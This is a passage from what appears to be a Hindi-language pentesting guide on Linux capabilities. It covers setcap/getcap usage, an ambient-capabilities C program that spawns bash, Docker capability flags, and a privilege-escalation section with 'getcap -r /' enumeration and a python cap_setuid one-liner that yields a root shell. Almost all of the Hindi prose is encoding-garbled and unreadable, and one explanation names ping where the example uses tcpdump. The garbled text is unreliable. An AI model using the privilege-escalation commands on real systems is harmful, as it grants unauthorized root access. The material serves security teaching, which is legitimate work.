capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, _capsh_ ‡§ï‡•Ä ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§ï‡•á ‡§∏‡§æ‡§•, _tcpdump_ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§≠‡•Ä ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§â‡§†‡§æ‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è‡•§

> /bin/bash: /usr/sbin/tcpdump: ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à

‡§Ø‡§π ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§¶‡§ø‡§ñ‡§æ‡§§‡•Ä ‡§π‡•à ‡§ï‡§ø ‡§™‡§ø‡§Ç‡§ó ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ï‡•ã ‡§è‡§ï ICMP ‡§∏‡•â‡§ï‡•á‡§ü ‡§ñ‡•ã‡§≤‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§ ‡§Ö‡§¨ ‡§π‡§Æ ‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ú‡§æ‡§®‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ø‡§π ‡§â‡§Æ‡•ç‡§Æ‡•Ä‡§¶ ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞ ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

### ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§π‡§ü‡§æ‡§è‡§Ç

‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
```bash
setcap -r </path/to/binary>
```
## ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç

‡§∂‡§æ‡§Ø‡§¶ **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à**‡•§ ‡§Ø‡§π ‡§∂‡§æ‡§Ø‡§¶ ‡§á‡§∏‡§ï‡§æ ‡§Ö‡§∞‡•ç‡§• ‡§π‡•à ‡§ï‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡§∞ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§ó‡•Ä‡•§\
[‡§á‡§∏](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [‡§á‡§∏](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) ‡§î‡§∞ [‡§á‡§∏](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) ‡§ï‡•á ‡§Ü‡§ß‡§æ‡§∞ ‡§™‡§∞ ‡§ï‡•Å‡§õ ‡§´‡§º‡§æ‡§á‡§≤‡•á‡§Ç ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•Ä ‡§π‡•ã‡§ó‡•Ä ‡§§‡§æ‡§ï‡§ø ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§¶‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡•á‡§Ç, ‡§≤‡•á‡§ï‡§ø‡§® ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§Ö‡§∏‡§æ‡§á‡§® ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§´‡§º‡§æ‡§á‡§≤ `/etc/security/capability.conf` ‡§π‡•ã‡§ó‡•Ä‡•§\
‡§´‡§º‡§æ‡§á‡§≤ ‡§â‡§¶‡§æ‡§π‡§∞‡§£:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## ‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§ï‡•ã ‡§ï‡§Ç‡§™‡§æ‡§á‡§≤ ‡§ï‡§∞‡§ï‡•á **‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§è‡§ï ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§¨‡•à‡§∂ ‡§∂‡•à‡§≤ ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à**‡•§

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**‡§¨‡§æ‡§∂** ‡§Æ‡•á‡§Ç **‡§ï‡§Ç‡§™‡§æ‡§á‡§≤‡•ç‡§° ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞, **‡§®‡§à ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç** ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•Ä ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à (‡§è‡§ï ‡§∏‡§æ‡§ß‡§æ‡§∞‡§£ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã "‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§®" ‡§ñ‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§ï‡•ã‡§à ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡•Ä)‡•§
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
‡§Ü‡§™ **‡§ï‡•á‡§µ‡§≤ ‡§â‡§® capabilities ‡§ï‡•ã ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã permitted ‡§î‡§∞ inheritable ‡§∏‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à‡§Ç**‡•§
{% endhint %}

### ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ-‡§ú‡§æ‡§ó‡§∞‡•Ç‡§ï/‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ-‡§Æ‡•Ç‡§∞‡•ç‡§ñ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä

**‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ-‡§ú‡§æ‡§ó‡§∞‡•Ç‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä** ‡§®‡§à ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§Ç‡§ó‡•Ä ‡§ú‡•ã ‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§¶‡•Ä ‡§ó‡§à ‡§π‡•à‡§Ç, ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø **‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ-‡§Æ‡•Ç‡§∞‡•ç‡§ñ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç‡§ó‡•Ä** ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§µ‡•á ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§Ö‡§∏‡•ç‡§µ‡•Ä‡§ï‡§æ‡§∞ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§Ç‡§ó‡•Ä‡•§ ‡§Ø‡§π ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ-‡§Æ‡•Ç‡§∞‡•ç‡§ñ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§Ö‡§µ‡§∞‡•ã‡§ß‡§ø‡§§ ‡§¨‡§®‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

## ‡§∏‡•á‡§µ‡§æ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç

‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á **‡§∞‡•Ç‡§ü ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§∏‡•á‡§µ‡§æ ‡§ï‡•ã ‡§∏‡§≠‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§∏‡•å‡§Ç‡§™‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä**, ‡§î‡§∞ ‡§ï‡§à ‡§Ö‡§µ‡§∏‡§∞‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§Ø‡§π ‡§ñ‡§§‡§∞‡§®‡§æ‡§ï ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§\
‡§á‡§∏‡§≤‡§ø‡§è, ‡§è‡§ï **‡§∏‡•á‡§µ‡§æ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§®** ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à, ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç ‡§Ü‡§™ ‡§á‡§∏‡•á ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, **‡§î‡§∞** ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ú‡•ã ‡§∏‡•á‡§µ‡§æ ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, ‡§Ö‡§®‡§æ‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡•á‡§µ‡§æ ‡§® ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è‡•§
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## ‡§°‡•â‡§ï‡§∞ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç

‡§°‡•â‡§ï‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§ï‡•Å‡§õ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§∏‡•å‡§Ç‡§™‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§á‡§® ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§ú‡§æ‡§Ç‡§ö‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§Ü‡§∏‡§æ‡§® ‡§π‡•à, ‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡§≤‡§æ‡§è‡§Ç:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) ‡§∏‡•ç‡§™‡•á‡§® ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§π‡•à ‡§î‡§∞ ‡§Ø‡•Ç‡§∞‡•ã‡§™ ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§∏‡•á ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§π‡•à‡•§ **‡§§‡§ï‡§®‡•Ä‡§ï‡•Ä ‡§ú‡•ç‡§û‡§æ‡§® ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§µ‡§æ ‡§¶‡•á‡§®‡•á ‡§ï‡•Ä ‡§Æ‡§ø‡§∂‡§® ‡§ï‡•á ‡§∏‡§æ‡§•**, ‡§Ø‡§π ‡§ï‡§æ‡§Ç‡§ó‡•ç‡§∞‡•á‡§∏ ‡§™‡•ç‡§∞‡•å‡§¶‡•ç‡§Ø‡•ã‡§ó‡§ø‡§ï‡•Ä ‡§î‡§∞ ‡§∏‡§æ‡§á‡§¨‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§ú‡•ç‡§û‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§â‡§¨‡§≤‡§§‡§æ ‡§π‡•Å‡§Ü ‡§Æ‡§ø‡§≤‡§® ‡§∏‡•ç‡§•‡§≤ ‡§π‡•à‡•§

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§§ ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§Ö‡§™‡§®‡•á ‡§ñ‡•Å‡§¶ ‡§ï‡•á ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡•Ä‡§Æ‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** (‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, chroot ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§∏‡•â‡§ï‡•á‡§ü ‡§∏‡•á ‡§¨‡§æ‡§á‡§Ç‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶), ‡§§‡•ã ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§®‡•ç‡§π‡•á‡§Ç ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§Ü‡§™ ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§¶‡•Å‡§∑‡•ç‡§ü ‡§Ü‡§¶‡•á‡§∂ ‡§Ø‡§æ ‡§§‡§∞‡•ç‡§ï ‡§™‡§æ‡§∏ ‡§ï‡§∞‡§ï‡•á ‡§ö‡§≤‡§æ‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§´‡§ø‡§∞ ‡§∞‡•Ç‡§ü ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ö‡§≤‡§æ‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§Ü‡§™ `setcap` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ‡•ã‡§Ç ‡§™‡§∞ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç ‡§•‡•ã‡§™ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ `getcap` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§á‡§®‡§ï‡•Ä ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` ‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§ï‡•ã ‡§ú‡•ã‡§°‡§º ‡§∞‡§π‡•á ‡§π‡•à‡§Ç ("-" ‡§á‡§∏‡•á ‡§π‡§ü‡§æ ‡§¶‡•á‡§ó‡§æ) ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø Effective ‡§î‡§∞ Permitted.

‡§è‡§ï ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§Ø‡§æ ‡§´‡§º‡•ã‡§≤‡•ç‡§°‡§∞ ‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ‡•ã‡§Ç ‡§ï‡•Ä ‡§™‡§π‡§ö‡§æ‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è:
```bash
getcap -r / 2>/dev/null
```
### ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡§æ ‡§∂‡•ã‡§ß

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç `/usr/bin/python2.6` ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§ï‡§ü‡§ó‡•ç‡§∞‡§∏‡•ç‡§§ ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**‡§ü‡•Ä‡§∏‡•Ä‡§™‡•Ä‡§°‡§Ç‡§™** ‡§ï‡•ã **‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§™‡•à‡§ï‡•á‡§ü ‡§∏‡•ç‡§®‡§ø‡§´ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï **‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Ç**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "‡§ñ‡§æ‡§≤‡•Ä" ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§Æ‡§æ‡§Æ‡§≤‡§æ

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§ñ‡§æ‡§≤‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§∏‡•á‡§ü ‡§¶‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à, ‡§î‡§∞ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§è‡§ï ‡§∏‡•á‡§ü-‡§Ø‡•Ç‡§ú‡§º‡§∞-‡§Ü‡§à‡§°‡•Ä-‡§∞‡•Ç‡§ü ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§¨‡§®‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡•á ‡§á‡§´‡§º‡•á‡§ï‡•ç‡§ü‡§ø‡§µ ‡§î‡§∞ ‡§∏‡•á‡§µ‡•ç‡§° ‡§∏‡•á‡§ü-‡§Ø‡•Ç‡§ú‡§º‡§∞-‡§Ü‡§à‡§°‡•Ä ‡§ï‡•ã 0 ‡§Æ‡•á‡§Ç ‡§¨‡§¶‡§≤‡§§‡§æ ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§â‡§∏ ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡•ã ‡§ï‡•ã‡§à ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ‡§è‡§Å ‡§®‡§π‡•Ä‡§Ç ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§æ ‡§∏‡•Ä‡§ß‡•á ‡§∂‡§¨‡•ç‡§¶‡•ã‡§Ç ‡§Æ‡•á‡§Ç 